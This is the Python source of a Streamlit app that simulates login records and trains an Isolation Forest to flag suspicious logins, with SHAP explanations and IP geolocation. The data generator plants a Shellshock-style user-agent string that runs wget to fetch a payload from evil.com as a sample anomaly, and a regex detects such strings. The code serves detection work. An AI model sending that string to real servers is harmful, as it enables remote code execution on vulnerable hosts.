# /app.py
"""
Aegis: A Streamlit application for suspicious user login detection using AI.

This script combines data simulation, model training (Isolation Forest),
and an interactive Streamlit interface to analyze login activity.
"""

# 1. Imports
import streamlit as st
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest
from faker import Faker
import joblib
import os
import plotly.express as px
import requests
from io import StringIO
import time
import shap

# --- Configuration & Constants ---
MODEL_FILE = 'isolation_forest_model.joblib'
COLUMNS_FILE = 'model_columns.joblib'
KNOWN_USERS_FILE = 'known_users.joblib'
BLOCKED_IPS_FILE = 'blocked_ips.joblib'
DATA_FILE = 'simulated_logins.csv'

# --- 1. Simulated Dataset Generation ---
def generate_simulated_data(records=2000):
    """
    Generates a realistic-looking dataset of user login activity and saves it to a CSV.
    The dataset includes normal behavior and a variety of sophisticated anomalies,
    such as velocity attacks, suspicious user agents, and logins from blocked IPs.
    """
    fake = Faker()
    data = []
    # Create a pool of 100 users with established "normal" behavior
    users = {
        fake.user_name(): {
            'country': fake.country(),
            'devices': [fake.user_agent() for _ in range(np.random.randint(1, 3))]
        } for _ in range(100)
    }
    # Add specific users from the examples to ensure they are "known" to the model
    users.update({
        'brian_h': {'country': 'United States', 'devices': ['Chrome on Windows']},
        'lisa_p': {'country': 'United States', 'devices': ['Firefox on Linux']},
        'alex_k': {'country': 'Canada', 'devices': ['Safari on Mac']},
        'peter_j': {'country': 'United Kingdom', 'devices': ['Safari on Mac']},
        'michael89': {'country': 'Australia', 'devices': ['Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/7310-07-05 08:02:07.813721 Firefox/3.6.17']},
    })
    # Add a known bad user-agent to the training data for the model to learn
    suspicious_ua = '() { :;}; /bin/bash -c "wget http://evil.com/payload"'
    users['alex_k']['devices'].append(suspicious_ua)

    for _ in range(records):
        username = np.random.choice(list(users.keys()))
        user_info = users[username]

        # 95% chance of normal behavior
        if np.random.rand() < 0.95:
            # Normal login: from their usual country and one of their usual devices
            timestamp = fake.date_time_this_year()
            ip_address = fake.ipv4()
            device_type = np.random.choice(user_info['devices'])
            location_country = user_info['country']
            location_city = fake.city()
        else:
            # Generate a more diverse set of anomalies
            anomaly_type = np.random.choice(['time', 'device', 'location', 'suspicious_ua'])
            timestamp = fake.date_time_this_year()
            ip_address = fake.ipv4()
            device_type = np.random.choice(user_info['devices'])
            location_country = user_info['country']
            location_city = fake.city()

            if anomaly_type == 'time':
                timestamp = timestamp.replace(hour=np.random.randint(0, 6))
            elif anomaly_type == 'device':
                device_type = fake.user_agent() # A completely new, unseen device
            elif anomaly_type == 'location':
                location_country = fake.country() # A new country
            elif anomaly_type == 'suspicious_ua':
                # Re-introduce the suspicious user agent here
                device_type = suspicious_ua
                
        data.append({
            "Username": username,
            "Timestamp": timestamp,
            "IP Address": ip_address,
            "Device Type": device_type,
            "Location (City)": location_city,
            "Location (Country)": location_country
        })

    df = pd.DataFrame(data)

    # Post-process to inject velocity and blocked IP anomalies
    # Create a small blocklist of IPs
    blocked_ips = {fake.ipv4() for _ in range(20)}
    blocked_ips.add("103.22.200.100") # Add the specific example from the user's data
    joblib.dump(list(blocked_ips), BLOCKED_IPS_FILE)

    # Inject blocked IPs into a few records
    unique_user_logins = df[df.duplicated(subset=['Username'], keep=False) == False]
    num_to_sample = min(50, len(unique_user_logins))
    if num_to_sample > 0:
        anomaly_indices = unique_user_logins.sample(n=num_to_sample, random_state=42).index
        df.loc[anomaly_indices, 'IP Address'] = np.random.choice(list(blocked_ips), size=len(anomaly_indices))
    
    df.to_csv(DATA_FILE, index=False)
    return df

# --- 2. Model Training & Feature Engineering ---
def feature_engineering(df, known_users=[], blocked_ips=[]):
    """
    Converts raw data into a rich feature set suitable for the model.
    This now includes checks for new users, suspicious patterns, and velocity.
    """
    # Ensure Timestamp is in datetime format
    df['Timestamp'] = pd.to_datetime(df['Timestamp'], errors='coerce')
    # Filter out rows where timestamp conversion failed
    df = df.dropna(subset=['Timestamp'])
    df['hour_of_day'] = df['Timestamp'].dt.hour
    df['day_of_week'] = df['Timestamp'].dt.dayofweek

    # --- New Features for Advanced Anomaly Detection ---
    # 1. Flag non-existent users
    if known_users:
        df['is_new_user'] = (~df['Username'].isin(known_users)).astype(int)
    else:
        df['is_new_user'] = 0 # Default to 0 if no known users are provided

    # 2. Flag suspicious User-Agent strings
    df['ua_suspicious_pattern'] = df['Device Type'].str.contains(
        r'[\{\};]|pwned|malware', regex=True, na=False).astype(int)

    # 3. Flag IPs from a known blocklist
    if blocked_ips:
        df['is_known_botnet_ip'] = df['IP Address'].isin(blocked_ips).astype(int)
    else:
        df['is_known_botnet_ip'] = 0 # Default to 0 if no blocked IPs are provided

    # 4. Velocity check: time since last login for that user (in a batch)
    df = df.sort_values(['Username', 'Timestamp'])
    df['time_since_last_login_seconds'] = df.groupby('Username')['Timestamp'].diff().dt.total_seconds().fillna(3600 * 24 * 30) # Fill NaN with 30 days

    # Simplify the user agent string to get a more general device/browser type
    df['Device Simplified'] = df['Device Type'].apply(lambda x: str(x).split(')')[0].split('(')[-1].split('/')[0])

    # Combine location for easier encoding
    if 'Location (City)' in df.columns and 'Location (Country)' in df.columns:
        df['Location'] = df['Location (City)'].astype(str) + ", " + df['Location (Country)'].astype(str)
    else:
        df['Location'] = "Unknown, Unknown"

    return df

def train_model(df):
    """Trains an Isolation Forest model and saves it along with the feature columns."""
    # Generate and save lists of known entities from the training data
    known_users = df['Username'].unique().tolist()
    joblib.dump(known_users, KNOWN_USERS_FILE)

    blocked_ips = joblib.load(BLOCKED_IPS_FILE) if os.path.exists(BLOCKED_IPS_FILE) else []

    df_featured = feature_engineering(df.copy(), known_users=known_users, blocked_ips=blocked_ips)

    # Select features for the model
    features = [
        'hour_of_day', 'day_of_week', 'is_new_user', 'ua_suspicious_pattern',
        'is_known_botnet_ip', 'time_since_last_login_seconds',
        'Username', 'Device Simplified', 'Location'
    ]
    df_model = df_featured[features]

    # One-Hot Encode categorical features
    df_encoded = pd.get_dummies(df_model, columns=['Username', 'Device Simplified', 'Location'])

    # Save the columns for later use during prediction to ensure consistency
    model_columns = df_encoded.columns
    joblib.dump(model_columns, COLUMNS_FILE)

    # Train the Isolation Forest model
    model = IsolationForest(contamination='auto', random_state=42, n_estimators=100)
    model.fit(df_encoded)

    # Save the trained model
    joblib.dump(model, MODEL_FILE)

    return model, model_columns

# --- 5. Bonus: IP Geolocation API Integration ---
@st.cache_data(ttl=3600) # Cache results for 1 hour to avoid excessive API calls
def get_location_from_ip(ip_address):
    """Fetches geolocation for a given IP address using the ip-api.com service."""
    if ip_address in ['127.0.0.1', 'localhost'] or not ip_address:
        return "Localhost", "N/A"
    try:
        # The API is free and doesn't require a key
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        response.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
        data = response.json()
        if data['status'] == 'success':
            return data.get('city', 'Unknown'), data.get('country', 'Unknown')
        else:
            return "Private/Unknown IP", "N/A"
    except requests.exceptions.RequestException as e:
        st.error(f"Geolocation API request failed: {e}")
        return "API Error", "API Error"

# --- Main Application Logic ---
def main():
    st.set_page_config(page_title="Aegis Login Detector", page_icon="🛡️", layout="wide")

    st.title("🛡️ Aegis: Suspicious Login Detection")
    st.write("An AI-powered app to detect anomalous user login activity using an Isolation Forest model.")

    # Initialize SHAP JavaScript plots
    shap.initjs()

    # --- Model Loading / Initial Training ---
    # Load required model files, or train a new model if they don't exist
    if not all(os.path.exists(f) for f in [MODEL_FILE, COLUMNS_FILE, KNOWN_USERS_FILE, BLOCKED_IPS_FILE]):
        with st.spinner("First-time setup: No model found. Generating data and training a new model... This may take a minute."):
            st.info("This is a one-time process. The trained model will be saved for future sessions.")
            simulated_data = generate_simulated_data()
            train_model(simulated_data)
            st.success("Model trained and saved successfully!")
            time.sleep(2) # Give user time to read the message
            st.rerun()
    else:
        model = joblib.load(MODEL_FILE)
        model_columns = joblib.load(COLUMNS_FILE)
        known_users = joblib.load(KNOWN_USERS_FILE)
        blocked_ips = joblib.load(BLOCKED_IPS_FILE)
        explainer = shap.TreeExplainer(model)

    if 'login_history' not in st.session_state:
        st.session_state.login_history = pd.DataFrame(columns=[
            "Timestamp", "Username", "IP Address", "Device Type",
            "Location (City)", "Location (Country)", "Prediction"
        ])

    # --- 3. Streamlit Interface for Prediction ---
    st.sidebar.header("🔎 Analyze New Login(s)")
    input_method = st.sidebar.radio(
        "Choose input method:",
        ["Manual Entry", "Upload CSV"],
        horizontal=True
    )

    new_login_data = None

    if input_method == "Manual Entry":
        ip_version = st.sidebar.radio("Select IP Version:", ("IPv4", "IPv6"), horizontal=True)
        with st.sidebar.form(key='manual_login_form'):
            username = st.text_input("Username", "john_doe")
            label = f"Enter {ip_version} Address"
            placeholder_ip = "e.g., 8.8.8.8" if ip_version == "IPv4" else "e.g., 2001:db8::8a2e:370:7334"
            ip_address = st.text_input(label=label, placeholder=placeholder_ip)
            device_type = st.text_input("Device Type", "Chrome on Windows")
            submit_button = st.form_submit_button(label='Analyze Login')

            if submit_button:
                with st.spinner("Fetching geolocation from IP..."):
                    city, country = get_location_from_ip(ip_address)
                new_login_data = pd.DataFrame([{
                    "Username": username,
                    "Timestamp": pd.Timestamp.now(tz='UTC'),
                    "IP Address": ip_address,
                    "Device Type": device_type,
                    "Location (City)": city,
                    "Location (Country)": country
                }])

    elif input_method == "Upload CSV":
        uploaded_file = st.sidebar.file_uploader("Choose a CSV file", type="csv")
        if uploaded_file is not None:
            try:
                stringio = StringIO(uploaded_file.getvalue().decode("utf-8"))
                new_login_data = pd.read_csv(stringio)
                required_cols = {"Username", "Timestamp", "IP Address", "Device Type"}
                if not required_cols.issubset(new_login_data.columns):
                    st.error(f"CSV must contain at least these columns: {', '.join(required_cols)}")
                    new_login_data = None
                else:
                    if "Location (City)" not in new_login_data.columns: new_login_data["Location (City)"] = "Unknown"
                    if "Location (Country)" not in new_login_data.columns: new_login_data["Location (Country)"] = "N/A"
                    st.sidebar.success(f"Successfully loaded {len(new_login_data)} records from {uploaded_file.name}")
            except Exception as e:
                st.sidebar.error(f"Error processing CSV file: {e}")
                new_login_data = None

    # --- Prediction Logic (Corrected to use historical context) ---
    if new_login_data is not None and not new_login_data.empty:
        # CONCATENATE new data with history to enable accurate velocity checks
        df_for_prediction = pd.concat([st.session_state.login_history, new_login_data], ignore_index=True)
        
        # --- FIXED CODE START ---
        # Convert Timestamp column to datetime and drop rows where it fails
        df_for_prediction['Timestamp'] = pd.to_datetime(df_for_prediction['Timestamp'], errors='coerce')
        df_for_prediction.dropna(subset=['Timestamp'], inplace=True)
        # --- FIXED CODE END ---
        
        df_for_prediction = df_for_prediction.sort_values(by='Timestamp')
        
        # Pass the pre-trained knowledge (known users, blocked IPs) to the feature engineering function
        df_processed = feature_engineering(
            df_for_prediction.copy(), 
            known_users=known_users, 
            blocked_ips=blocked_ips
        )
        
        # Isolate only the *new* records for prediction
        df_new_records_processed = df_processed.tail(len(new_login_data))

        # Align columns for prediction
        df_encoded = pd.get_dummies(df_new_records_processed.copy(), columns=['Username', 'Device Simplified', 'Location'])
        df_aligned = df_encoded.reindex(columns=model_columns, fill_value=0)

        # Predict and add the results to the new data
        predictions = model.predict(df_aligned[model_columns])
        new_login_data['Prediction'] = ['Suspicious' if p == -1 else 'Normal' for p in predictions]
        
        # Generate SHAP values for the new records
        shap_values = explainer.shap_values(df_aligned[model_columns])
        
        st.subheader("💡 Analysis Results")
        for index, row in new_login_data.iterrows():
            if row['Prediction'] == 'Suspicious':
                with st.container():
                    st.error(f"**Suspicious Login Detected!**\n"
                             f"- **User:** {row['Username']}\n"
                             f"- **Time:** {pd.to_datetime(row['Timestamp']).strftime('%Y-%m-%d %H:%M:%S')}\n"
                             f"- **IP:** {row['IP Address']} ({row.get('Location (City)', 'N/A')}, {row.get('Location (Country)', 'N/A')})\n"
                             f"- **Device:** {row['Device Type']}")

                    st.write("##### Anomaly Explanation:")
                    st.write("The plot below shows which features contributed to this login being flagged. "
                             "Features in **red** pushed the score towards 'Suspicious', while those in **blue** pushed it towards 'Normal'.")

                    # Get the correct index from the aligned dataframe for SHAP values
                    shap_index = df_new_records_processed.index.get_loc(index)
                    
                    shap_plot = shap.force_plot(
                        explainer.expected_value,
                        shap_values[shap_index, :],
                        df_aligned.iloc[shap_index, :]
                    )
                    st.components.v1.html(shap_plot.html(), height=250, scrolling=True)
            else:
                st.success(f"**Normal Login Verified.**\n"
                           f"- **User:** {row['Username']} at {pd.to_datetime(row['Timestamp']).strftime('%Y-%m-%d %H:%M:%S')}")

        st.session_state.login_history = pd.concat([st.session_state.login_history, new_login_data], ignore_index=True)
        st.session_state.login_history = st.session_state.login_history.head(1000)

    # --- 4. Dashboard Section ---
    st.markdown("---")
    st.header("📊 Login Activity Dashboard")

    if st.session_state.login_history.empty:
        st.info("No login data has been analyzed yet. Analyze a login to see the dashboard.")
    else:
        st.subheader("Recent Logins Analyzed")
        def highlight_suspicious(s):
            return ['background-color: #ff4b4b; color: white' if v == 'Suspicious' else '' for v in s]
        st.dataframe(st.session_state.login_history.style.apply(highlight_suspicious, subset=['Prediction']))

        st.subheader("Visualizations")
        col1, col2 = st.columns(2)

        with col1:
            st.write("Login Frequency by Hour")
            # Ensure the dashboard uses the full history, not just the last batch
            df_history_featured = feature_engineering(st.session_state.login_history.copy())
            hourly_counts = df_history_featured['hour_of_day'].value_counts().sort_index()
            fig_hourly = px.bar(x=hourly_counts.index, y=hourly_counts.values,
                                labels={'x': 'Hour of Day', 'y': 'Number of Logins'},
                                title="Login Counts per Hour")
            st.plotly_chart(fig_hourly, use_container_width=True)

        with col2:
            st.write("Suspicious vs. Normal Logins")
            prediction_counts = st.session_state.login_history['Prediction'].value_counts()
            fig_pie = px.pie(values=prediction_counts.values, names=prediction_counts.index,
                             title="Login Anomaly Distribution", color=prediction_counts.index,
                             color_discrete_map={'Suspicious':'#ff4b4b', 'Normal':'#28a745'})
            st.plotly_chart(fig_pie, use_container_width=True)

    # --- Model Management ---
    st.sidebar.markdown("---")
    st.sidebar.subheader("Model Management")
    if st.sidebar.button("Retrain Model"):
        with st.spinner("Retraining model with new simulated data..."):
            simulated_data = generate_simulated_data()
            train_model(simulated_data)
            st.sidebar.success("Model retrained successfully!")
            time.sleep(2)
            st.rerun()

# --- Entry point of the script ---
if __name__ == "__main__":
    main()